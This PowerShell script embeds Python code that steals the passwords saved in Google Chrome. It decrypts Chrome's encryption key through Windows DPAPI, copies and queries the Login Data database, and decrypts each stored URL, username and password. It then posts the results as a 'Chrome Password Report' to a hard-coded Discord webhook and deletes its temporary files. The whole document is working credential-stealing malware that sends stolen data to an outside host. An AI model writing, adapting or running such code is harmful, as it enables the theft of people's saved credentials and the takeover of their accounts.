$ErrorActionPreference = 'Stop'
$webhook = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

# Validate webhook URL format
if (-not $webhook.StartsWith("https://discord.com/api/webhooks/")) {
    Write-Host "❌ Invalid Discord webhook URL format"
    exit
}

# Check Python exists
try { 
    $null = python --version 2>&1 
} catch { 
    Write-Host "⚠️ Python not installed. Download: https://python.org"
    exit 
}

# Install requirements with error handling
try {
    python -m pip install --upgrade pip >$null 2>&1
    python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
} catch {
    Write-Host "❌ Failed to install Python dependencies"
    exit
}

# Python password extraction with improved error handling
$pythonCode = @'
import os, json, sqlite3, base64, win32crypt, sys
from Crypto.Cipher import AES
import shutil, uuid

def decrypt_password(password, key):
    try:
        # Handle new Chrome encryption (AES-GCM)
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted).decode()
        # Fallback to old DPAPI decryption
        else:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def main():
    results = []
    db_copy = None
    conn = None
    
    try:
        # Get Chrome profile path
        profile_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
        local_state = os.path.join(profile_path, 'Local State')
        
        # Verify Chrome installation
        if not os.path.exists(profile_path):
            return {'error': 'Chrome not installed'}
        
        # Get encryption key
        with open(local_state, 'r', encoding='utf-8') as f:
            encrypted_key = json.load(f)['os_crypt']['encrypted_key']
        key = win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
        
        # Check default profile
        login_db = os.path.join(profile_path, 'Default', 'Login Data')
        if not os.path.exists(login_db):
            # Try profile 1 if default doesn't exist
            login_db = os.path.join(profile_path, 'Profile 1', 'Login Data')
            if not os.path.exists(login_db):
                return {'error': 'Login database not found'}

        # Copy database (Chrome locks the file)
        db_copy = os.path.join(os.environ['TEMP'], f"{uuid.uuid4().hex}.db")
        shutil.copy2(login_db, db_copy)
        
        # Query database
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        
        # Process all entries
        for row in cursor.fetchall():
            url, user, pwd = row
            if not pwd:
                continue
                
            decrypted = decrypt_password(pwd, key)
            if decrypted or user:
                results.append({
                    'url': url, 
                    'username': user, 
                    'password': decrypted
                })
        
        return results
    except Exception as e:
        return {'error': f'{type(e).__name__}: {str(e)}'}
    finally:
        if conn:
            conn.close()
        if db_copy and os.path.exists(db_copy):
            for _ in range(3):  # Retry cleanup
                try:
                    os.remove(db_copy)
                    break
                except:
                    pass

if __name__ == '__main__':
    try:
        result = main()
        print(json.dumps(result))
    except Exception as e:
        print(json.dumps({'error': f'CRITICAL: {str(e)}'}))
'@

# Execute with robust error handling
$tempFile = "$env:TEMP\chrome_$(Get-Random).py"
try {
    # Write and execute Python
    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
    $rawOutput = python $tempFile 2>&1 | Out-String
    $exitCode = $LASTEXITCODE
    
    # Handle output truncation (Discord limit: 4096 chars)
    $MAX_LENGTH = 3500
    $displayOutput = if ($rawOutput.Length -gt $MAX_LENGTH) {
        $rawOutput.Substring(0, $MAX_LENGTH) + "`n... [TRUNCATED]"
    } else {
        $rawOutput
    }

    # Determine embed color
    $color = if ($exitCode -ne 0 -or $rawOutput -match '"error"') { 
        16711680 # Red 
    } else { 
        65280    # Green
    }

    # Build Discord payload
    $embed = @{
        title = "Chrome Password Report"
        description = "```json`n$displayOutput`n```"
        color = $color
        timestamp = (Get-Date -Format o)
    }
    
    $payload = @{
        username = "Password Extractor"
        embeds = @($embed)
    }
    
    # Send to Discord
    $jsonPayload = $payload | ConvertTo-Json -Depth 5 -Compress
    Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload -ContentType 'application/json' -ErrorAction Stop >$null
}
catch {
    Write-Host "⚠️ Final Error: $_"
}
finally {
    # Guaranteed cleanup
    if (Test-Path $tempFile) {
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    }
}
